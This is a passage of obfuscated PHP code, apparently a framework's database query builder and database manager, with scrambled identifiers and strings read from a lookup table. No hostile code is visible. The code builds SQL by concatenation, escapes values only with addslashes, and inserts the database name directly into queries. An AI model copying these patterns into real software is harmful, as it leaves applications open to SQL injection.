$²ôÕ¸ê = $this->escapeString($²ôÕ¸ê[1]); } elseif (is_array($²ôÕ¸ê)) { $²ôÕ¸ê = array_map(array($this, $ŸüøÓæá[1068]), $²ôÕ¸ê); } elseif (is_bool($²ôÕ¸ê)) { $²ôÕ¸ê = $²ôÕ¸ê ? $ŸüøÓæá[101] : $ŸüøÓæá[239]; } elseif (is_null($²ôÕ¸ê)) { $²ôÕ¸ê = $ŸüøÓæá[114]; } return $²ôÕ¸ê; } protected function parseField($‹¾ƒîñå) { $Åå”ƒ²´ =& $_SERVER[‰‰Ş‚€]; if (is_string($‹¾ƒîñå) && strpos($‹¾ƒîñå, $Åå”ƒ²´[60])) { $‹¾ƒîñå = explode($Åå”ƒ²´[60], $‹¾ƒîñå); } if (is_array($‹¾ƒîñå)) { $ìäëÄ´ = array(); foreach ($‹¾ƒîñå as $×Ú¯åİï => $¦Äƒ„ß) { if (!is_numeric($×Ú¯åİï)) { $ìäëÄ´[] = $this->parseKey($×Ú¯åİï, !1) . $Åå”ƒ²´[1108] . $this->parseKey($¦Äƒ„ß); } else { $ìäëÄ´[] = $this->parseKey($¦Äƒ„ß); } } $Ï‚˜ÂşÖ = implode($Åå”ƒ²´[60], $ìäëÄ´); } elseif (is_string($‹¾ƒîñå) && !empty($‹¾ƒîñå)) { $Ï‚˜ÂşÖ = $‹¾ƒîñå; } else { $Ï‚˜ÂşÖ = $Åå”ƒ²´[231]; } return $Ï‚˜ÂşÖ; } protected function parseTable($‹¹öš¹) { $•ÛÔéªÂ =& $_SERVER[‰‰Ş‚€]; if (is_array($‹¹öš¹)) { $ğ«ñÂÎÜ = array(); foreach ($‹¹öš¹ as $Ø¸Šå‚ => $ïÛ×ÂÅ½) { if (!is_numeric($Ø¸Šå‚)) { $ğ«ñÂÎÜ[] = $this->parseKey($Ø¸Šå‚) . $•ÛÔéªÂ[63] . $this->parseKey($ïÛ×ÂÅ½); } else { $ğ«ñÂÎÜ[] = $this->parseKey($Ø¸Šå‚); } } $‹¹öš¹ = $ğ«ñÂÎÜ; } elseif (is_string($‹¹öš¹)) { if (strstr($‹¹öš¹, $•ÛÔéªÂ[63])) { return $‹¹öš¹; } $‹¹öš¹ = explode($•ÛÔéªÂ[60], $‹¹öš¹); array_walk($‹¹öš¹, array($this, $•ÛÔéªÂ[1013])); } return $•ÛÔéªÂ[1007] . trim(implode($•ÛÔéªÂ[1109], $‹¹öš¹), $•ÛÔéªÂ[480]) . $•ÛÔéªÂ[1007]; } protected function parseWhere($ØŒáùÏî) { $ƒ§èˆì˜ =& $_SERVER[‰‰Ş‚€]; $öÌÔú‚ó = $ƒ§èˆì˜[22]; if (is_string($ØŒáùÏî)) { $öÌÔú‚ó = $ØŒáùÏî; } else { $’„¼Üâ‰ = isset($ØŒáùÏî[$ƒ§èˆì˜[1110]]) ? strtoupper($ØŒáùÏî[$ƒ§èˆì˜[1110]]) : $ƒ§èˆì˜[22]; if (in_array($’„¼Üâ‰, array($ƒ§èˆì˜[1111], $ƒ§èˆì˜[1112], $ƒ§èˆì˜[1113]))) { $’„¼Üâ‰ = $ƒ§èˆì˜[63] . $’„¼Üâ‰ . $ƒ§èˆì˜[63]; unset($ØŒáùÏî[$ƒ§èˆì˜[1110]]); } else { $’„¼Üâ‰ = $ƒ§èˆì˜[1114]; } foreach ($ØŒáùÏî as $‰İòğ¸– => $ïœ¨†Ô€) { $öÌÔú‚ó .= $ƒ§èˆì˜[364]; if (is_numeric($‰İòğ¸–)) { $‰İòğ¸– = $ƒ§èˆì˜[1115]; } if (0 === strpos($‰İòğ¸–, $ƒ§èˆì˜[21])) { $öÌÔú‚ó .= $this->parseThinkWhere($‰İòğ¸–, $ïœ¨†Ô€); } else { if (!preg_match($ƒ§èˆì˜[1116], trim($‰İòğ¸–))) { think_exception(think_lang($ƒ§èˆì˜[1117]) . $ƒ§èˆì˜[14] . $‰İòğ¸–); } $„şÂÄÆ£ = is_array($ïœ¨†Ô€) && isset($ïœ¨†Ô€[$ƒ§èˆì˜[1118]]); $‰İòğ¸– = trim($‰İòğ¸–); if (strpos($‰İòğ¸–, $ƒ§èˆì˜[223])) { $¦š©½§ç = explode($ƒ§èˆì˜[223], $‰İòğ¸–); $Ê¹Æî±Ö = array(); foreach ($¦š©½§ç as $İı‰›ëê => $ùÛæ¨ØÍ) { $ã¾³ËŒ× = $„şÂÄÆ£ ? $ïœ¨†Ô€[$İı‰›ëê] : $ïœ¨†Ô€; $Ê¹Æî±Ö[] = $ƒ§èˆì˜[347] . $this->parseWhereItem($this->parseKey($ùÛæ¨ØÍ), $ã¾³ËŒ×) . $ƒ§èˆì˜[1012]; } $öÌÔú‚ó .= implode($ƒ§èˆì˜[1119], $Ê¹Æî±Ö); } elseif (strpos($‰İòğ¸–, $ƒ§èˆì˜[295])) { $¦š©½§ç = explode($ƒ§èˆì˜[295], $‰İòğ¸–); $Ê¹Æî±Ö = array(); foreach ($¦š©½§ç as $İı‰›ëê => $ùÛæ¨ØÍ) { $ã¾³ËŒ× = $„şÂÄÆ£ ? $ïœ¨†Ô€[$İı‰›ëê] : $ïœ¨†Ô€; $Ê¹Æî±Ö[] = $ƒ§èˆì˜[347] . $this->parseWhereItem($this->parseKey($ùÛæ¨ØÍ), $ã¾³ËŒ×) . $ƒ§èˆì˜[1012]; } $öÌÔú‚ó .= implode($ƒ§èˆì˜[1114], $Ê¹Æî±Ö); } else { $öÌÔú‚ó .= $this->parseWhereItem($this->parseKey($‰İòğ¸–), $ïœ¨†Ô€); } } $öÌÔú‚ó .= $ƒ§èˆì˜[365] . $’„¼Üâ‰; } $öÌÔú‚ó = substr($öÌÔú‚ó, 0, -strlen($’„¼Üâ‰)); } return empty($öÌÔú‚ó) ? $ƒ§èˆì˜[22] : $ƒ§èˆì˜[1120] . $öÌÔú‚ó; } protected function parseWhereItem($‹©ô÷ğì, $ëä­¿“–) { $ƒØ½„ã =& $_SERVER[‰‰Ş‚€]; $ñîæë = $ƒØ½„ã[22]; if (is_array($ëä­¿“–)) { if (is_string($ëä­¿“–[0])) { $ëÆÌ¯é„ = strtolower($ëä­¿“–[0]); if (in_array($ëä­¿“–[0], array($ƒØ½„ã[472], $ƒØ½„ã[1121], $ƒØ½„ã[1122], $ƒØ½„ã[1123], $ƒØ½„ã[1124], $ƒØ½„ã[1125]))) { $ñîæë .= $‹©ô÷ğì . $ƒØ½„ã[63] . $ëä­¿“–[0] . $ƒØ½„ã[63] . $this->parseValue($ëä­¿“–[1]); } elseif (preg_match($ƒØ½„ã[1126], $ëä­¿“–[0])) { $ñîæë .= $‹©ô÷ğì . $ƒØ½„ã[63] . $this->exp[$ëÆÌ¯é„] . $ƒØ½„ã[63] . $this->parseValue($ëä­¿“–[1]); } elseif (preg_match($ƒØ½„ã[1127], $ëä­¿“–[0])) { if (is_array($ëä­¿“–[1])) { $‰ñ†ù¹‹ = isset($ëä­¿“–[2]) ? strtoupper($ëä­¿“–[2]) : $ƒØ½„ã[1112]; if (in_array($‰ñ†ù¹‹, array($ƒØ½„ã[1111], $ƒØ½„ã[1112], $ƒØ½„ã[1113]))) { $şˆœ¶´Ó = array(); foreach ($ëä­¿“–[1] as $³ùÕêéƒ) { $şˆœ¶´Ó[] = $‹©ô÷ğì . $ƒØ½„ã[63] . $this->exp[$ëÆÌ¯é„] . $ƒØ½„ã[63] . $this->parseValue($³ùÕêéƒ); } $ñîæë .= $ƒØ½„ã[347] . implode($ƒØ½„ã[63] . $‰ñ†ù¹‹ . $ƒØ½„ã[63], $şˆœ¶´Ó) . $ƒØ½„ã[1012]; } } else { $ñîæë .= $‹©ô÷ğì . $ƒØ½„ã[63] . $this->exp[$ëÆÌ¯é„] . $ƒØ½„ã[63] . $this->parseValue($ëä­¿“–[1]); } } elseif ($ƒØ½„ã[381] == $ëÆÌ¯é„) { $ñîæë .= $ƒØ½„ã[1010] . $‹©ô÷ğì . $ƒØ½„ã[63] . $ëä­¿“–[1] . $ƒØ½„ã[1128]; } elseif (preg_match($ƒØ½„ã[1129], $ëä­¿“–[0])) { $ñîæë .= $ëä­¿“–[0]; } elseif (preg_match($ƒØ½„ã[1130], $ëä­¿“–[0])) { if (isset($ëä­¿“–[2]) && $ƒØ½„ã[381] == $ëä­¿“–[2]) { $ñîæë .= $‹©ô÷ğì . $ƒØ½„ã[63] . $this->exp[$ëÆÌ¯é„] . $ƒØ½„ã[63] . $ëä­¿“–[1]; } else { if (is_string($ëä­¿“–[1])) { $ëä­¿“–[1] = explode($ƒØ½„ã[60], $ëä­¿“–[1]); } $ªÒØ… = implode($ƒØ½„ã[60], $this->parseValue($ëä­¿“–[1])); $ñîæë .= $‹©ô÷ğì . $ƒØ½„ã[63] . $this->exp[$ëÆÌ¯é„] . $ƒØ½„ã[1010] . $ªÒØ… . $ƒØ½„ã[1012]; } } elseif (preg_match($ƒØ½„ã[1131], $ëä­¿“–[0])) { $¯ù‹¡ ‹ = is_string($ëä­¿“–[1]) ? explode($ƒØ½„ã[60], $ëä­¿“–[1]) : $ëä­¿“–[1]; $ñîæë .= $ƒØ½„ã[1010] . $‹©ô÷ğì . $ƒØ½„ã[63] . $this->exp[$ëÆÌ¯é„] . $ƒØ½„ã[63] . $this->parseValue($¯ù‹¡ ‹[0]) . $ƒØ½„ã[1114] . $this->parseValue($¯ù‹¡ ‹[1]) . $ƒØ½„ã[365]; } else { think_exception(think_lang($ƒØ½„ã[1117]) . $ƒØ½„ã[14] . $ëä­¿“–[0]); } } else { $¨—İìş = count($ëä­¿“–); $ß©ÔæŞ÷ = $ƒØ½„ã[22]; if (is_string($ëä­¿“–[$¨—İìş - 1])) { $ß©ÔæŞ÷ = isset($ëä­¿“–[$¨—İìş - 1]) ? strtoupper($ëä­¿“–[$¨—İìş - 1]) : $ƒØ½„ã[22]; if (in_array($ß©ÔæŞ÷, array($ƒØ½„ã[1111], $ƒØ½„ã[1112], $ƒØ½„ã[1113]))) { $¨—İìş = $¨—İìş - 1; } } else { $ß©ÔæŞ÷ = $ƒØ½„ã[1111]; } for ($ó¢Æ´¹¨ = 0; $ó¢Æ´¹¨ < $¨—İìş; $ó¢Æ´¹¨++) { $¯ù‹¡ ‹ = is_array($ëä­¿“–[$ó¢Æ´¹¨]) ? $ëä­¿“–[$ó¢Æ´¹¨][1] : $ëä­¿“–[$ó¢Æ´¹¨]; if ($ƒØ½„ã[381] == strtolower($ëä­¿“–[$ó¢Æ´¹¨][0])) { $ñîæë .= $ƒØ½„ã[347] . $‹©ô÷ğì . $ƒØ½„ã[63] . $¯ù‹¡ ‹ . $ƒØ½„ã[1128] . $ß©ÔæŞ÷ . $ƒØ½„ã[63]; } else { $íéÏŞ¥¾ = is_array($ëä­¿“–[$ó¢Æ´¹¨]) ? $this->exp[strtolower($ëä­¿“–[$ó¢Æ´¹¨][0])] : $ƒØ½„ã[472]; if (!$íéÏŞ¥¾ && is_array($ëä­¿“–[$ó¢Æ´¹¨]) && in_array($ëä­¿“–[$ó¢Æ´¹¨][0], array($ƒØ½„ã[472], $ƒØ½„ã[1121], $ƒØ½„ã[1122], $ƒØ½„ã[1123], $ƒØ½„ã[1124], $ƒØ½„ã[1125]))) { $íéÏŞ¥¾ = $ëä­¿“–[$ó¢Æ´¹¨][0]; } $ñîæë .= $ƒØ½„ã[347] . $‹©ô÷ğì . $ƒØ½„ã[63] . $íéÏŞ¥¾ . $ƒØ½„ã[63] . $this->parseValue($¯ù‹¡ ‹) . $ƒØ½„ã[1128] . $ß©ÔæŞ÷ . $ƒØ½„ã[63]; } } $ñîæë = substr($ñîæë, 0, -4); } } else { $ñîæë .= $‹©ô÷ğì . $ƒØ½„ã[1132] . $this->parseValue($ëä­¿“–); } return $ñîæë; } protected function parseThinkWhere($¤«Í„Ú˜, $¯®ë¹à) { $ÁÜ±º¬ù =& $_SERVER[‰‰Ş‚€]; $‹Ş©åùä = $ÁÜ±º¬ù[22]; switch ($¤«Í„Ú˜) { case $ÁÜ±º¬ù[436]: $‹Ş©åùä = $¯®ë¹à; break; case $ÁÜ±º¬ù[1115]: $‹Ş©åùä = is_string($¯®ë¹à) ? $¯®ë¹à : substr($this->parseWhere($¯®ë¹à), 6); break; case $ÁÜ±º¬ù[1133]: parse_str($¯®ë¹à, $÷ØÄÈéÓ); if (isset($÷ØÄÈéÓ[$ÁÜ±º¬ù[1110]])) { $Òî½¶ãú = $ÁÜ±º¬ù[63] . strtoupper($÷ØÄÈéÓ[$ÁÜ±º¬ù[1110]]) . $ÁÜ±º¬ù[63]; unset($÷ØÄÈéÓ[$ÁÜ±º¬ù[1110]]); } else { $Òî½¶ãú = $ÁÜ±º¬ù[1114]; } $ßîç”Ôø = array(); foreach ($÷ØÄÈéÓ as $’Öœµ´ => $ÜÌ¤¯ÎÕ) { $ßîç”Ôø[] = $this->parseKey($’Öœµ´) . $ÁÜ±º¬ù[1132] . $this->parseValue($ÜÌ¤¯ÎÕ); } $‹Ş©åùä = implode($Òî½¶ãú, $ßîç”Ôø); break; } return $‹Ş©åùä; } protected function parseLimit($æŠø¸ª‡) { $‘êè–àä =& $_SERVER[‰‰Ş‚€]; return !empty($æŠø¸ª‡) ? $‘êè–àä[61] . $æŠø¸ª‡ . $‘êè–àä[63] : $‘êè–àä[22]; } protected function parseJoin($ĞàÊª€Ö) { $ĞÕ¡†³© =& $_SERVER[‰‰Ş‚€]; $ÁÁ‡ú¤¨ = $ĞÕ¡†³©[22]; if (!empty($ĞàÊª€Ö)) { if (is_array($ĞàÊª€Ö)) { foreach ($ĞàÊª€Ö as $™âì¬ÈÖ => $´óÛ£ü) { if (!1 !== stripos($´óÛ£ü, $ĞÕ¡†³©[1134])) { $ÁÁ‡ú¤¨ .= $ĞÕ¡†³©[63] . $´óÛ£ü; } else { $ÁÁ‡ú¤¨ .= $ĞÕ¡†³©[1135] . $´óÛ£ü; } } } else { $ÁÁ‡ú¤¨ .= $ĞÕ¡†³©[1135] . $ĞàÊª€Ö; } } $ÁÁ‡ú¤¨ = preg_replace($ĞÕ¡†³©[1136], think_config($ĞÕ¡†³©[1040]) . $ĞÕ¡†³©[1137], $ÁÁ‡ú¤¨); return $ÁÁ‡ú¤¨; } protected function parseOrder($ÎÜœø¯) { $ÎƒİÃñ£ =& $_SERVER[‰‰Ş‚€]; if (is_array($ÎÜœø¯)) { $ú˜§šŞ‡ = array(); foreach ($ÎÜœø¯ as $–§Š§•ó => $Ü¡ãëµı) { if (is_numeric($–§Š§•ó)) { $ú˜§šŞ‡[] = $this->parseKey($Ü¡ãëµı); } else { $Ü¡ãëµı = in_array(strtoupper(trim($Ü¡ãëµı)), array($ÎƒİÃñ£[1138], $ÎƒİÃñ£[1139])) ? $ÎƒİÃñ£[63] . $Ü¡ãëµı : $ÎƒİÃñ£[22]; if (preg_match($ÎƒİÃñ£[1140], $–§Š§•ó)) { $ú˜§šŞ‡[] = $this->parseKey($–§Š§•ó) . $Ü¡ãëµı; } else { think_exception($ÎƒİÃñ£[1141] . $–§Š§•ó); } } } $ÎÜœø¯ = implode($ÎƒİÃñ£[60], $ú˜§šŞ‡); } return !empty($ÎÜœø¯) ? $ÎƒİÃñ£[1142] . $ÎÜœø¯ : $ÎƒİÃñ£[22]; } protected function parseGroup($ŠáÍøß™) { $İœ»Ñ¥Í =& $_SERVER[‰‰Ş‚€]; return !empty($ŠáÍøß™) ? $İœ»Ñ¥Í[1143] . $ŠáÍøß™ : $İœ»Ñ¥Í[22]; } protected function parseHaving($¤ˆÙáÖŞ) { $òåûòç¡ =& $_SERVER[‰‰Ş‚€]; return !empty($¤ˆÙáÖŞ) ? $òåûòç¡[1144] . $¤ˆÙáÖŞ : $òåûòç¡[22]; } protected function parseComment($à¼¼É÷) { $®ş’ğÏ =& $_SERVER[‰‰Ş‚€]; return !empty($à¼¼É÷) ? $®ş’ğÏ[1145] . $à¼¼É÷ . $®ş’ğÏ[1146] : $®ş’ğÏ[22]; } protected function parseDistinct($¡¨œĞíø) { $»—ğ« Ï =& $_SERVER[‰‰Ş‚€]; return !empty($¡¨œĞíø) ? $»—ğ« Ï[1147] : $»—ğ« Ï[22]; } protected function parseUnion($­öáûÄÀ) { $ĞÒƒ¿à =& $_SERVER[‰‰Ş‚€]; if (empty($­öáûÄÀ)) { return $ĞÒƒ¿à[22]; } if (isset($­öáûÄÀ[$ĞÒƒ¿à[432]])) { $ïÂç¼çõ = $ĞÒƒ¿à[1148]; unset($­öáûÄÀ[$ĞÒƒ¿à[432]]); } else { $ïÂç¼çõ = $ĞÒƒ¿à[1149]; } foreach ($­öáûÄÀ as $ßÕˆÛ“ë) { $†ƒŠëà–[] = $ïÂç¼çõ . (is_array($ßÕˆÛ“ë) ? $this->buildSelectSql($ßÕˆÛ“ë) : $ßÕˆÛ“ë); } return implode($ĞÒƒ¿à[63], $†ƒŠëà–); } public function insert($áÒîÙ¨‹, $£„ÏŠÇ² = array(), $İĞ‡¯Ï = false) { $Áâï…  =& $_SERVER[‰‰Ş‚€]; $Íğğ„ƒğ = $ù†³ô¿Ë = array(); $this->model = $£„ÏŠÇ²[$Áâï… [368]]; foreach ($áÒîÙ¨‹ as $¸ù«…ß => $¡»É²™¡) { if (is_array($¡»É²™¡) && $Áâï… [381] == $¡»É²™¡[0]) { $ù†³ô¿Ë[] = $this->parseKey($¸ù«…ß); $Íğğ„ƒğ[] = $¡»É²™¡[1]; } elseif (is_scalar($¡»É²™¡) || is_null($¡»É²™¡)) { $ù†³ô¿Ë[] = $this->parseKey($¸ù«…ß); $Íğğ„ƒğ[] = $this->parseValue($¡»É²™¡); } } $ß¹Í£¥Ÿ = ($İĞ‡¯Ï ? $Áâï… [1014] : $Áâï… [1015]) . $Áâï… [1016] . $this->parseTable($£„ÏŠÇ²[$Áâï… [366]]) . $Áâï… [1010] . implode($Áâï… [60], $ù†³ô¿Ë) . $Áâï… [1011] . implode($Áâï… [60], $Íğğ„ƒğ) . $Áâï… [1012]; $ß¹Í£¥Ÿ .= $this->parseLock(isset($£„ÏŠÇ²[$Áâï… [951]]) ? $£„ÏŠÇ²[$Áâï… [951]] : !1); $ß¹Í£¥Ÿ .= $this->parseComment(!empty($£„ÏŠÇ²[$Áâï… [438]]) ? $£„ÏŠÇ²[$Áâï… [438]] : $Áâï… [22]); return $this->execute($ß¹Í£¥Ÿ, $this->parseBind(!empty($£„ÏŠÇ²[$Áâï… [370]]) ? $£„ÏŠÇ²[$Áâï… [370]] : array())); } public function selectInsert($†Ş™÷ÏÄ, $˜öûßÏ, $­òÈœ™Ü = array()) { $Û¥ÓˆÎõ =& $_SERVER[‰‰Ş‚€]; $this->model = $­òÈœ™Ü[$Û¥ÓˆÎõ[368]]; if (is_string($†Ş™÷ÏÄ)) { $†Ş™÷ÏÄ = explode($Û¥ÓˆÎõ[60], $†Ş™÷ÏÄ); } array_walk($†Ş™÷ÏÄ, array($this, $Û¥ÓˆÎõ[1013])); $¶Å…ËÁ‰ = $Û¥ÓˆÎõ[1150] . $this->parseTable($˜öûßÏ) . $Û¥ÓˆÎõ[1010] . implode($Û¥ÓˆÎõ[60], $†Ş™÷ÏÄ) . $Û¥ÓˆÎõ[1128]; $¶Å…ËÁ‰ .= $this->buildSelectSql($­òÈœ™Ü); return $this->execute($¶Å…ËÁ‰, $this->parseBind(!empty($­òÈœ™Ü[$Û¥ÓˆÎõ[370]]) ? $­òÈœ™Ü[$Û¥ÓˆÎõ[370]] : array())); } public function update($“×Ÿ„±í, $‡ÏóìÛ°) { $äÅ¾¥ç =& $_SERVER[‰‰Ş‚€]; $this->model = $‡ÏóìÛ°[$äÅ¾¥ç[368]]; $ò˜ÚøşÁ = $äÅ¾¥ç[1151] . $this->parseTable($‡ÏóìÛ°[$äÅ¾¥ç[366]]) . $this->parseSet($“×Ÿ„±í) . $this->parseWhere(!empty($‡ÏóìÛ°[$äÅ¾¥ç[362]]) ? $‡ÏóìÛ°[$äÅ¾¥ç[362]] : $äÅ¾¥ç[22]) . $this->parseOrder(!empty($‡ÏóìÛ°[$äÅ¾¥ç[450]]) ? $‡ÏóìÛ°[$äÅ¾¥ç[450]] : $äÅ¾¥ç[22]) . $this->parseLimit(!empty($‡ÏóìÛ°[$äÅ¾¥ç[377]]) ? $‡ÏóìÛ°[$äÅ¾¥ç[377]] : $äÅ¾¥ç[22]) . $this->parseLock(isset($‡ÏóìÛ°[$äÅ¾¥ç[951]]) ? $‡ÏóìÛ°[$äÅ¾¥ç[951]] : !1) . $this->parseComment(!empty($‡ÏóìÛ°[$äÅ¾¥ç[438]]) ? $‡ÏóìÛ°[$äÅ¾¥ç[438]] : $äÅ¾¥ç[22]); return $this->execute($ò˜ÚøşÁ, $this->parseBind(!empty($‡ÏóìÛ°[$äÅ¾¥ç[370]]) ? $‡ÏóìÛ°[$äÅ¾¥ç[370]] : array())); } public function delete($„öè´«Š = array()) { $şÙó¸Î =& $_SERVER[‰‰Ş‚€]; $this->model = $„öè´«Š[$şÙó¸Î[368]]; $ı¥åóà = $şÙó¸Î[1152] . $this->parseTable($„öè´«Š[$şÙó¸Î[366]]) . $this->parseWhere(!empty($„öè´«Š[$şÙó¸Î[362]]) ? $„öè´«Š[$şÙó¸Î[362]] : $şÙó¸Î[22]) . $this->parseOrder(!empty($„öè´«Š[$şÙó¸Î[450]]) ? $„öè´«Š[$şÙó¸Î[450]] : $şÙó¸Î[22]) . $this->parseLimit(!empty($„öè´«Š[$şÙó¸Î[377]]) ? $„öè´«Š[$şÙó¸Î[377]] : $şÙó¸Î[22]) . $this->parseLock(isset($„öè´«Š[$şÙó¸Î[951]]) ? $„öè´«Š[$şÙó¸Î[951]] : !1) . $this->parseComment(!empty($„öè´«Š[$şÙó¸Î[438]]) ? $„öè´«Š[$şÙó¸Î[438]] : $şÙó¸Î[22]); return $this->execute($ı¥åóà, $this->parseBind(!empty($„öè´«Š[$şÙó¸Î[370]]) ? $„öè´«Š[$şÙó¸Î[370]] : array())); } public function select($¹¥·²Ú = array()) { $É®‘£àà =& $_SERVER[‰‰Ş‚€]; $this->model = $¹¥·²Ú[$É®‘£àà[368]]; $ï„Ì‡†¡ = $this->buildSelectSql($¹¥·²Ú); $äÑ×Â†¾ = isset($¹¥·²Ú[$É®‘£àà[433]]) ? $¹¥·²Ú[$É®‘£àà[433]] : !1; if ($äÑ×Â†¾) { $¾Ô°‹ÔÏ = is_string($äÑ×Â†¾[$É®‘£àà[105]]) ? $äÑ×Â†¾[$É®‘£àà[105]] : $É®‘£àà[1153] . md5($ï„Ì‡†¡); $¯•ÈÅ“Õ = think_cache($¾Ô°‹ÔÏ, $É®‘£àà[22], $äÑ×Â†¾); if (!1 !== $¯•ÈÅ“Õ) { return $¯•ÈÅ“Õ; } } $ÑİåéŠ™ = $this->query($ï„Ì‡†¡, $this->parseBind(!empty($¹¥·²Ú[$É®‘£àà[370]]) ? $¹¥·²Ú[$É®‘£àà[370]] : array())); if ($äÑ×Â†¾ && !1 !== $ÑİåéŠ™) { think_cache($¾Ô°‹ÔÏ, $ÑİåéŠ™, $äÑ×Â†¾); } return $ÑİåéŠ™; } public function buildSelectSql($ş§—±– = array()) { $¸Ø…áı  =& $_SERVER[‰‰Ş‚€]; if (isset($ş§—±–[$¸Ø…áı [437]])) { if (strpos($ş§—±–[$¸Ø…áı [437]], $¸Ø…áı [60])) { list($ÑÀ—©¡‹, $¬ÜÀüåæ) = explode($¸Ø…áı [60], $ş§—±–[$¸Ø…áı [437]]); } else { $ÑÀ—©¡‹ = $ş§—±–[$¸Ø…áı [437]]; } $ÑÀ—©¡‹ = $ÑÀ—©¡‹ ? $ÑÀ—©¡‹ : 1; $¬ÜÀüåæ = isset($¬ÜÀüåæ) ? $¬ÜÀüåæ : (is_numeric($ş§—±–[$¸Ø…áı [377]]) ? $ş§—±–[$¸Ø…áı [377]] : 20); $µÒª‚ = $¬ÜÀüåæ * ((int) $ÑÀ—©¡‹ - 1); $ş§—±–[$¸Ø…áı [377]] = $µÒª‚ . $¸Ø…áı [60] . $¬ÜÀüåæ; } if (think_config($¸Ø…áı [1154])) { $ßİƒÎò— = $¸Ø…áı [1155] . md5(serialize($ş§—±–)); $ªò†Â” = think_cache($ßİƒÎò—); if ($ªò†Â”) { return $ªò†Â”; } } $ˆƒÆ–šÊ = $this->parseSql($this->selectSql, $ş§—±–); $ˆƒÆ–šÊ .= $this->parseLock(isset($ş§—±–[$¸Ø…áı [951]]) ? $ş§—±–[$¸Ø…áı [951]] : !1); if (isset($ßİƒÎò—)) { think_cache($ßİƒÎò—, $ˆƒÆ–šÊ); } return $ˆƒÆ–šÊ; } public function parseSql($³ô²§‘«, $¸„Ó‰’ = array()) { $œ½«ŠŒã =& $_SERVER[‰‰Ş‚€]; $³ô²§‘« = str_replace(array($œ½«ŠŒã[1156], $œ½«ŠŒã[1157], $œ½«ŠŒã[1158], $œ½«ŠŒã[1159], $œ½«ŠŒã[1160], $œ½«ŠŒã[1161], $œ½«ŠŒã[1162], $œ½«ŠŒã[1163], $œ½«ŠŒã[1164], $œ½«ŠŒã[1165], $œ½«ŠŒã[1166]), array($this->parseTable("{$¸„Ó‰’[$œ½«ŠŒã[366]]}"), $this->parseDistinct(isset($¸„Ó‰’[$œ½«ŠŒã[1167]]) ? $¸„Ó‰’[$œ½«ŠŒã[1167]] : !1), $this->parseField(!empty($¸„Ó‰’[$œ½«ŠŒã[360]]) ? $¸„Ó‰’[$œ½«ŠŒã[360]] : $œ½«ŠŒã[231]), $this->parseJoin(!empty($¸„Ó‰’[$œ½«ŠŒã[369]]) ? $¸„Ó‰’[$œ½«ŠŒã[369]] : $œ½«ŠŒã[22]), $this->parseWhere(!empty($¸„Ó‰’[$œ½«ŠŒã[362]]) ? $¸„Ó‰’[$œ½«ŠŒã[362]] : $œ½«ŠŒã[22]), $this->parseGroup(!empty($¸„Ó‰’[$œ½«ŠŒã[598]]) ? $¸„Ó‰’[$œ½«ŠŒã[598]] : $œ½«ŠŒã[22]), $this->parseHaving(!empty($¸„Ó‰’[$œ½«ŠŒã[1168]]) ? $¸„Ó‰’[$œ½«ŠŒã[1168]] : $œ½«ŠŒã[22]), $this->parseOrder(!empty($¸„Ó‰’[$œ½«ŠŒã[450]]) ? $¸„Ó‰’[$œ½«ŠŒã[450]] : $œ½«ŠŒã[22]), $this->parseLimit(!empty($¸„Ó‰’[$œ½«ŠŒã[377]]) ? $¸„Ó‰’[$œ½«ŠŒã[377]] : $œ½«ŠŒã[22]), $this->parseUnion(!empty($¸„Ó‰’[$œ½«ŠŒã[431]]) ? $¸„Ó‰’[$œ½«ŠŒã[431]] : $œ½«ŠŒã[22]), $this->parseComment(!empty($¸„Ó‰’[$œ½«ŠŒã[438]]) ? $¸„Ó‰’[$œ½«ŠŒã[438]] : $œ½«ŠŒã[22])), $³ô²§‘«); return $³ô²§‘«; } public function getLastSql($›…¬ß”› = '') { return $›…¬ß”› ? $this->modelSql[$›…¬ß”›] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ç‚…Ê Û) { return addslashes($ç‚…Ê Û); } public function setModel($±ƒÕ¾äı) { $this->model = $±ƒÕ¾äı; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($“¶şÔ®Ú = array()) { $ûõ© ‹ =& $_SERVER[‰‰Ş‚€]; if (empty($“¶şÔ®Ú)) { $“¶şÔ®Ú = $GLOBALS[$ûõ© ‹[16]][$ûõ© ‹[31]]; } $this->database = $“¶şÔ®Ú; } public function model($ú–şºÕ = '') { return new ModelBase($ú–şºÕ, $_SERVER[‰‰Ş‚€][22], $this->database); } public function db($—½’ƒ§Ó = false) { $†ó­ãŒš =& $_SERVER[‰‰Ş‚€]; $Ù„ÚÀ‘ = array_change_key_case($this->database); if ($this->dbType() == $†ó­ãŒš[23] || !$—½’ƒ§Ó) { return $this->model()->db(); } $Î¶ª»¿ = $Ù„ÚÀ‘[$†ó­ãŒš[1082]]; $Ù„ÚÀ‘[$†ó­ãŒš[1082]] = $†ó­ãŒš[22]; if ($Ù„ÚÀ‘[$†ó­ãŒš[1077]] == $†ó­ãŒš[1074]) { $ˆ“¼ÚŞ‘ = $Ù„ÚÀ‘[$†ó­ãŒš[1083]]; $Ù„ÚÀ‘[$†ó­ãŒš[1083]] = substr($ˆ“¼ÚŞ‘, 0, strrpos($ˆ“¼ÚŞ‘, $†ó­ãŒš[1169])); } $this->database = $Ù„ÚÀ‘; $Œ¥¶‡Ö = $this->model()->db(); try { $çÏ±Ğ¤³ = $Œ¥¶‡Ö->execute("\x73\x68\157\167\x20\144\x61\x74\x61\142\x61\x73\145\163\40\x6c\151\x6b\145\x20\47{$Î¶ª»¿}\x27"); } catch (Exception $í¼Ÿà¥ç) { } if (!$çÏ±Ğ¤³) { $Œ¥¶‡Ö->execute("\143\162\x65\141\164\x65\40\144\x61\x74\141\142\141\163\145\x20\x60{$Î¶ª»¿}\140"); } $Ù„ÚÀ‘[$†ó­ãŒš[1082]] = $Î¶ª»¿; if ($Ù„ÚÀ‘[$†ó­ãŒš[1077]] == $†ó­ãŒš[1074]) { $Ù„ÚÀ‘[$†ó­ãŒš[1083]] .= $†ó­ãŒš[1169] . $Î¶ª»¿; } $this->database = $Ù„ÚÀ‘; $Œ¥¶‡Ö->execute("\x75\x73\x65\x20\x60{$Î¶ª»¿}\x60"); return $Œ¥¶‡Ö; } public function createTable($ÄÛÍşÚ«, &$ºŞ­êç) { $§ïŞ÷¹ =& $_SERVER[‰‰Ş‚€]; if (!IO::exist($ÄÛÍşÚ«)) { show_json(LNG($§ïŞ÷¹[1170]), !1); } $Ë°Ûı® = $this->model()->db(); $É£Õ ›í = 